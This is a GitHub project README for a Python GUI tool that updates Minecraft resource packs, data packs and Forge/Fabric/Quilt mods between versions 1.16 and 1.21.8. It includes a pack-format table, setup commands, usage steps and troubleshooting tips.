# MC-Pack-Version-Converter
# 🎮 MC-Pack Version Converter

A simple and intuitive GUI tool for updating Minecraft resource packs, data packs, and mods between different Minecraft versions (1.16 - 1.21.8).

## ✨ Features

- 🎯 **Simple GUI Interface** - Clean, user-friendly design
- 📦 **Multiple Pack Types** - Resource Packs, Data Packs, and Mods
- 🔄 **Version Range** - Supports Minecraft 1.16 through 1.21.8
- 🛠️ **Smart Conversion** - Automatically updates pack_format and mod metadata
- 🚀 **One-Click Operation** - Select file, choose versions, and convert
- 📁 **Preserves Structure** - Maintains all original files and folders
- ⚡ **Fast Processing** - Lightweight and efficient conversion

## 🎯 Supported Pack Types

### Resource Packs (.zip)
- Automatic `pack.mcmeta` updates
- Preserves all textures, models, and assets
- Handles OptiFine and MCPatcher content

### Data Packs (.zip)
- Updates data pack format
- Maintains recipes, loot tables, and functions
- Preserves custom namespaces

### Mods (.jar)
- **Forge Mods** - Updates `META-INF/mods.toml`
- **Fabric Mods** - Updates `fabric.mod.json`
- **Quilt Mods** - Updates `quilt.mod.json`

## 🔧 Supported Minecraft Versions

| Version Range | Pack Format | Status |
|---------------|-------------|---------|
| 1.16 - 1.16.5 | 6 | ✅ Supported |
| 1.17 - 1.17.1 | 7 | ✅ Supported |
| 1.18 - 1.18.1 | 8 | ✅ Supported |
| 1.18.2 | 9 | ✅ Supported |
| 1.19 - 1.19.2 | 9 | ✅ Supported |
| 1.19.3 | 12 | ✅ Supported |
| 1.19.4 | 13 | ✅ Supported |
| 1.20 - 1.20.1 | 15 | ✅ Supported |
| 1.20.2 | 18 | ✅ Supported |
| 1.20.3 - 1.20.4 | 22 | ✅ Supported |
| 1.20.5 - 1.20.6 | 32 | ✅ Supported |
| 1.21 - 1.21.1 | 34 | ✅ Supported |
| 1.21.2 - 1.21.3 | 42 | ✅ Supported |
| 1.21.4 | 46 | ✅ Supported |
| 1.21.5 | 55 | ✅ Supported |
| 1.21.6 | 63 | ✅ Supported |
| 1.21.7 - 1.21.8 | 64 | ✅ Supported |

## 📥 Installation & Usage

### Download and Run
1. Go to the [latest release](../../releases/latest)
2. Download `MC-Pack-Version-Converter-v1.0.zip`
3. Unzip the downloaded file
4. Run `minecraft_pack_updater.py` (Python is required)

⚠️ **Important Note**: If you download and run anything other than `MC-Pack-Version-Converter-v1.0.zip`, the "Convert" button may disappear due to a malfunction. Please make sure to download `MC-Pack-Version-Converter-v1.0.zip`.

### Run from Source (Alternative)
```bash
# Clone the repository
git clone https://github.com/zerdo5555/MC-Pack-Version-Converter.git
cd MC-Pack-Version-Converter

# Install dependencies (optional)
pip install -r requirements.txt

# Run the application
python minecraft_pack_updater.py
```

### How to Use
1. **Select Pack Type** - Choose from: Mod, Resource Pack, or Data Pack
2. **Set Versions**
   - **Pack Version**: Current version of your pack
   - **MC Version**: Target Minecraft version
3. **Select Pack File** - Click the "..." button to browse for your pack file (.jar for mods, .zip for resource/data packs)
4. **Convert** - Press the "Convert" button to complete the process
5. **Output** - The converted pack will be saved in the same folder as the original file with "_vX.XX.X" suffix

## ⚙️ How It Works

The converter updates the following files automatically:

- **Resource Packs**: `pack.mcmeta` (pack_format update)
- **Data Packs**: `pack.mcmeta` (pack_format update for data)
- **Forge Mods**: `META-INF/mods.toml` (version dependencies)
- **Fabric Mods**: `fabric.mod.json` (Minecraft version requirements)
- **Quilt Mods**: `quilt.mod.json` (version dependencies)

## ⚠️ Important Notes

- 🔒 **Always backup your original files** before conversion
- 🧪 **Test converted packs** in your target Minecraft version
- 📝 **Not all content may be compatible** across major version changes
- 🎨 **Texture/model changes** between versions are not handled automatically
- 🔧 **Complex mod dependencies** may require manual adjustment

## 🐛 Troubleshooting

### Common Issues

**"File not found" error**
- Make sure the selected file exists and is not corrupted
- Check file permissions

**"Conversion failed" error**
- Verify the pack file is a valid .jar or .zip
- Ensure the file is not password-protected
- Try a different pack file to test

**Converted pack doesn't work**
- Some packs may have version-specific features
- Check the original pack's compatibility notes
- Test with a simple pack first

### Getting Help

- 📋 [Open an Issue](../../issues/new) for bug reports
- 💬 [Discussions](../../discussions) for questions

## 🔧 Technical Specifications

### System Requirements
- Python 3.8 or higher
- tkinter (included with Python standard library)
- Optional: Pillow (for image processing), toml (for TOML parsing)

### File Structure
```
MC-Pack-Version-Converter/
├── minecraft_pack_updater.py  # Main application
├── requirements.txt           # Python dependencies
├── setup.py                  # Setup script
├── README.md                 # This file
├── LICENSE                   # MIT License
├── .gitignore               # Git ignore settings
├── docs/                    # Documentation
├── examples/                # Sample files
└── tests/                   # Test files
```

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

1. 🍴 Fork the repository
2. 🌟 Create a feature branch
3. 💻 Make your changes
4. 🧪 Test thoroughly
5. 📤 Submit a pull request

### Development Setup
```bash
git clone https://github.com/zerdo5555/MC-Pack-Version-Converter.git
cd MC-Pack-Version-Converter
pip install -r requirements.txt
python minecraft_pack_updater.py
```

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- 🎮 Mojang Studios for Minecraft
- 🔧 Forge, Fabric, and Quilt communities
- 🎨 All the texture pack and mod creators
- 👥 Contributors and users of this tool
